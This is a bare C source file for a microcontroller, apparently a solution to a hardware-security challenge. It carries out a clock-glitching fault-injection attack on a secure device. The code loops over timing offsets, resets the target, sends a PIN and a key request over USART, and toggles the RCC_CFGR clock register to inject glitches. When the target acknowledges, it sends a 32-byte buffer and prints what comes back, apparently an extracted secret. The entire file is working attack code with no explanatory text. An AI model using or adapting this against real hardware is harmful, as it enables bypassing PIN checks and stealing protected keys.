#include <stdint.h>

#define rcc_cfgr (*((volatile uint32_t*)0x40023808))

void delay(uint32_t);

void shell_main(){
    uint32_t rcc_cfgr_mask = rcc_cfgr & ~(0b111 << 24);
    uint32_t rcc_cfgr_1 = rcc_cfgr_mask;
    uint32_t rcc_cfgr_5 = rcc_cfgr_mask + (0b111 << 24);

    for (int i=110; i<160; ++i){
        sec_reset();
        delay(100000);
        uint32_t t = i;
        debug_print("time: ");
        debug_print_i32(t);
        debug_println("");

        char* pin = "13372020";
        usart_flush(0x20000000);
        usart_tx(0x20000000, 0x03); // Send instruction
        usart_tx_buf(0x20000000, pin, 8);
        uint8_t ack = usart_rx(0x20000000);
        usart_tx(0x20000000, 0x02); // Send key number
        delay(t);
        rcc_cfgr = rcc_cfgr_1;
        rcc_cfgr = rcc_cfgr_5;
        delay(300);
        uint32_t avail = usart_avail(0x20000000);
        if (avail == 1){
            ack = usart_rx(0x20000000);
            debug_print("ack: ");
            debug_print_i32(ack);
            debug_println("");
            if (ack == 1){
                debug_println("GOOD");
                uint8_t buf[] = {
                    0x19, 0x6b, 0xc5, 0x15, 0xf3, 0x9b, 0xa5, 0x41,
                    0xbe, 0xf8, 0xe0, 0xfb, 0x5e, 0x74, 0xc2, 0xcb,
                    0x2d, 0x00, 0x6e, 0xf5, 0xd1, 0x14, 0x50, 0xfc,
                    0x86, 0x03, 0x01, 0xa2, 0x65, 0xc8, 0xe6, 0x84, 0};
                usart_tx(0x20000000, 0x02);
                usart_tx_buf(0x20000000, buf, 32);
                usart_rx_buf(0x20000000, buf, 32);
                debug_println(buf);
            }
        }
    }
    reset();
}
